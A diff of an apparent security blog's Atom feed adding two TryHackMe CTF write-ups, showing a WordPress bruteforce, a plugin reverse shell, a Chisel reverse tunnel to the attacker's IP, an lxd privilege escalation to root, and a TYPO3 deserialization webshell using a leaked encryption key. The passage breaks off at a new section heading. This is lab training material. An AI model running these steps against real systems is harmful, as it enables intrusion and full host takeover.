@@ -4,13 +4,242 @@
  <title>Hacking on the Horizon</title>
  <link href="https://h0th.lol/atom.xml" rel="self"/>
  <link href="https://h0th.lol/"/>
- <updated>2021-09-21T19:27:46-05:00</updated>
+ <updated>2021-10-10T19:56:18-05:00</updated>
  <id>https://h0th.lol</id>
  <author>
    <name></name>
    <email></email>
  </author>
 
+ 
+ <entry>
+   <title>CTF Log - For Business Reasons {THM}</title>
+   <link href="https://h0th.lol/2021/10/10/for-buisness-reasons-ctf-log"/>
+   <updated>2021-10-10T00:00:00-05:00</updated>
+   <id>https://h0th.lol/2021/10/10/for-buisness-reasons-ctf-log</id>
+   <content type="html">&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A log of how I did the TryHackMe room For Business Reasons by MsMouse&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;for-business-reasons&quot;&gt;For Business Reasons&lt;/h1&gt;
+&lt;h2 id=&quot;wordpress-login-bruteforce--plugin-reverse-shell&quot;&gt;Wordpress Login Bruteforce &amp;amp; Plugin Reverse Shell&lt;/h2&gt;
+&lt;p&gt;Scanned and received responses from the following ports: 22, 80, 2377, 7946. Only port 80 registered as open.&lt;/p&gt;
+
+&lt;p&gt;Found a Wordpress blog and noticed that the default/template posts were made by a user named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysadmin.&lt;/code&gt; So, I chucked a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; bruteforce against that username while I further enumerated the site.&lt;/p&gt;
+
+&lt;p&gt;Soon after, I landed a valid password.&lt;/p&gt;
+
+&lt;p&gt;I chucked a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; bruteforce against the username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysadmin&lt;/code&gt; while I researched that vulnerability and landed a valid password.&lt;/p&gt;
+
+&lt;p&gt;Edited an existing plugin to include a PHP reverse shell and enabled the plugin; got a shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; in a Docker container.&lt;/p&gt;
+
+&lt;h2 id=&quot;proxying-through-docker-container&quot;&gt;Proxying Through Docker Container&lt;/h2&gt;
+&lt;p&gt;The Docker container I landed in was lacking a lot core networking utils like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ifconfig&lt;/code&gt;, etc. After poking around for a while I stumbled upon &lt;a href=&quot;https://staaldraad.github.io/2017/12/20/netstat-without-netstat/&quot;&gt;this&lt;/a&gt; fantastic blog post by &lt;a href=&quot;https://staaldraad.github.io/&quot;&gt;Staaldraad&lt;/a&gt;. In it they detail some research into parsing data from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/net/tcp&lt;/code&gt; pseudofile to recreate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netstat&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; commands.&lt;/p&gt;
+
+&lt;p&gt;I use their &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;awk&lt;/code&gt; script:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'function hextodec(str,ret,n,i,k,c){
+    ret = 0
+    n = length(str)
+    for (i = 1; i &amp;lt;= n; i++) {
+        c = tolower(substr(str, i, 1))
+        k = index(&quot;123456789abcdef&quot;, c)
+        ret = ret * 16 + k
+    }
+    return ret
+}
+function getIP(str,ret){
+    ret=hextodec(substr(str,index(str,&quot;:&quot;)-2,2)); 
+    for (i=5; i&amp;gt;0; i-=2) {
+        ret = ret&quot;.&quot;hextodec(substr(str,i,2))
+    }
+    ret = ret&quot;:&quot;hextodec(substr(str,index(str,&quot;:&quot;)+1,4))
+    return ret
+} 
+NR &amp;gt; 1 {{if(NR==2)print &quot;Local - Remote&quot;;local=getIP($2);remote=getIP($3)}{print local&quot; - &quot;remote}}'&lt;/span&gt; /proc/net/tcp
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;to see the current open TCP connections.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/forbusinessreasons/proc_net_tcp_netstat.png&quot; alt=&quot;Screenshot of aforementioned awk script and output.&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I noticed a connection between &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.18.0.3&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.13.1.225&lt;/code&gt;. Since the latter is my attack machine’s IP address I conclude that the former IP address belongs to the container that I’m in. From there I correctly assume that the gateway address of that subnet, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.18.0.1&lt;/code&gt;, belongs to the machine hosting the Docker container; I use the following to scan for certain ports on that address.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;--include&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; localhost:&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-m 1&lt;/code&gt; Setting a max timeout time for the curl attempt, prevents me from getting stuck on an unresponsive port, which would require me to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl+c&lt;/code&gt; and thusly break my non-pty shell.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;After identifying an open port 22 on the host machine, I download &lt;a href=&quot;https://github.com/jpillora/chisel&quot;&gt;Chisel&lt;/a&gt; onto the docker container and launch the client command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./chisel client 10.13.1.225:1234 R:2002:172.168.0.1:22
+2021/09/13 21:34:59 client: Connecting to ws://10.13.1.225:1234
+2021/09/13 21:35:00 client: Connected &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Latency 184.290108ms&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And on my attacker machine, the server command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[/opt/chisel/binaries]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./chisel_1.7.6_linux_amd64 server &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1234 &lt;span class=&quot;nt&quot;&gt;--reverse&lt;/span&gt;
+
+2021/09/13 16:32:53 server: Reverse tunnelling enabled
+2021/09/13 16:32:53 server: Fingerprint gOtbf9dlNJ2ecdo44g20iAMt+SSp8NkeAfp5CWKusaU&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+2021/09/13 16:32:53 server: Listening on http://0.0.0.0:1234
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I’m then able to ssh against my local machine and have my request proxied through to the victim host machine. The credentials for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysadmin&lt;/code&gt; are reused from the Wordpress blog.&lt;/p&gt;
+
+&lt;h2 id=&quot;lxc-privileged-recursive-container-filesystem-privesc&quot;&gt;lxc Privileged, Recursive Container Filesystem Privesc&lt;/h2&gt;
+&lt;p&gt;The privilege escalation technique is simple. My user, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysadmin&lt;/code&gt;, belongs to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lxd&lt;/code&gt; group which by default allows that user to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lxc&lt;/code&gt; to escalate privileges.&lt;/p&gt;
+
+&lt;p&gt;I create an &lt;a href=&quot;https://hub.docker.com/_/alpine&quot;&gt;Alpine&lt;/a&gt; container on my attacker machine using &lt;a href=&quot;https://github.com/lxc/distrobuilder&quot;&gt;Distrobuilder&lt;/a&gt; then download the resulting files onto the victim machine.&lt;/p&gt;
+
+&lt;p&gt;I then execute the following sequence of commands (Learned from &lt;a href=&quot;https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation&quot;&gt;Hacktricks&lt;/a&gt;) to create a privileged docker container whose filesystem contains a recursive mount of the host machine’s filesystem. This allows me to enter the docker container as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; and act upon the host filesystem as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sysadmin@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;lxc image import lxd.tar.xz rootfs.squashfs &lt;span class=&quot;nt&quot;&gt;--alias&lt;/span&gt; alpine
+Image imported with fingerprint: 02aa7f299f733b42a726c44d6505645cf23e67ebcb31fda3ec24e8c2d4c0497b             
+sysadmin@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;lxc init alpine privesc &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; security.privileged&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true             
+&lt;/span&gt;Creating privesc
+sysadmin@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;lxc config device add privesc host-root disk &lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/ &lt;span class=&quot;nv&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/mnt/root &lt;span class=&quot;nv&quot;&gt;recursive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true
+&lt;/span&gt;Device host-root added to privesc
+sysadmin@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;lxc start privesc
+sysadmin@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;lxc &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;privesc /bin/sh
+~ &lt;span class=&quot;c&quot;&gt;# id&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>CTF Log - EnterPrize {THM}</title>
+   <link href="https://h0th.lol/2021/09/27/enterprize-ctf-log"/>
+   <updated>2021-09-27T00:00:00-05:00</updated>
+   <id>https://h0th.lol/2021/09/27/enterprize-ctf-log</id>
+   <content type="html">&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A log of how I did the TryHackMe room EnterPrize by superhero1&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;enterprize&quot;&gt;EnterPrize&lt;/h1&gt;
+&lt;h2 id=&quot;enumerating-web-presence&quot;&gt;Enumerating Web Presence&lt;/h2&gt;
+&lt;p&gt;My initial portscan finds ports 22, 80, and 443 open.&lt;/p&gt;
+
+&lt;p&gt;Checking the web server, I’m greeting a message &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nothing to see here&lt;/code&gt;. I add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enterprize.thm&lt;/code&gt; to my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; and begin to fuzz for subdomains and subdirectories.&lt;/p&gt;
+
+&lt;p&gt;I find a loose &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;composer.json&lt;/code&gt; file:&lt;/p&gt;
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;superhero1/enterprize&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;THM room EnterPrize&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;project&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;require&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;typo3/cms-core&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;^9.5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;guzzlehttp/guzzle&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;~6.3.3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;guzzlehttp/psr7&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;~1.4.2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;typo3/cms-install&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;^9.5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+	&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;typo3/cms-backend&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;^9.5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;typo3/cms-core&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;^9.5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;typo3/cms-extbase&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;^9.5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;typo3/cms-extensionmanager&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;^9.5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;typo3/cms-frontend&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;^9.5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;typo3/cms-install&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;^9.5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+	&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;typo3/cms-introduction&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;^4.0&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;license&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GPL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;minimum-stability&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stable&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This file proves important later.&lt;/p&gt;
+
+&lt;p&gt;The subdomain bruteforce returns a site at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maintest.enterprize.thm&lt;/code&gt;, so I add that to my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; and fuzz that site for subdirectories to find &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fileadmin&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;typo3conf&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;typo3temp&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;typo3&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;typo3-deserialization&quot;&gt;Typo3 Deserialization&lt;/h2&gt;
+&lt;p&gt;I was able to find the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LocalConfiguration.old&lt;/code&gt; file in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/typo3conf/&lt;/code&gt; subdirectory.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+	&lt;span class=&quot;o&quot;&gt;&amp;lt;--&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SNIPPED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;s1&quot;&gt;'SYS'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+        &lt;span class=&quot;s1&quot;&gt;'devIPmask'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s1&quot;&gt;'displayErrors'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s1&quot;&gt;'encryptionKey'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s1&quot;&gt;'exceptionalErrors'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s1&quot;&gt;'features'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+            &lt;span class=&quot;s1&quot;&gt;'newTranslationServer'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;s1&quot;&gt;'unifiedPageTranslationHandling'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
+        &lt;span class=&quot;s1&quot;&gt;'sitename'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'EnterPrize'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s1&quot;&gt;'systemLogLevel'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s1&quot;&gt;'systemMaintainers'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+            &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The relevant portion here will end up being the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;encryptionKey&lt;/code&gt;. Doing some research into the &lt;a href=&quot;https://github.com/TYPO3/typo3&quot;&gt;Typo3&lt;/a&gt; CMS and  the dependencies from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;composer.json&lt;/code&gt; file led me to &lt;a href=&quot;https://www.synacktiv.com/publications/typo3-leak-to-remote-code-execution.html&quot;&gt;this&lt;/a&gt; disclosure by &lt;a href=&quot;https://www.synacktiv.com/index.html&quot;&gt;Synacktiv&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;The context allowing for the vulnerability prerequisites (Knowledge of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;encryptionKey&lt;/code&gt;), is different between their post and this situation, but regardless, I have access to the key so I continued to research the vulnerability.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.synacktiv.com/index.html&quot;&gt;For a deeper look into the source code enabling this vulnerability, give the blog post a read; it’s well written and informative.&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The &lt;em&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;initializeFormStateFromRequest()&lt;/code&gt;&lt;/em&gt; function in Typo3 will insecurely deserialize arbitary data if it is received in a POST request form body with a valid HMAC signature.&lt;/p&gt;
+
+  &lt;p&gt;The &lt;em&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;guzzlehttp/guzzle&quot;: &quot;~6.3.3&quot;&lt;/code&gt;&lt;/em&gt; dependency provides a gadget chain that can be used for remote code execution upon deserialization.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I use &lt;a href=&quot;https://github.com/ambionics/phpggc&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpgcc&lt;/code&gt;&lt;/a&gt; to create a remote code execution payload which will write a webshell to the publically accessible &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/fileadmin/_temp_/&lt;/code&gt; directory. After signing it with an HMAC created with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;encryptionKey&lt;/code&gt;, I send the malicious serialized payload in a POST form found on the website.&lt;/p&gt;
+
+&lt;p&gt;Navigating to the webshell allows me to execute arbitrary commands on the underlying machine and I catch a reverse shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;symlink-and-malicious-library&quot;&gt;Symlink and Malicious Library&lt;/h2&gt;
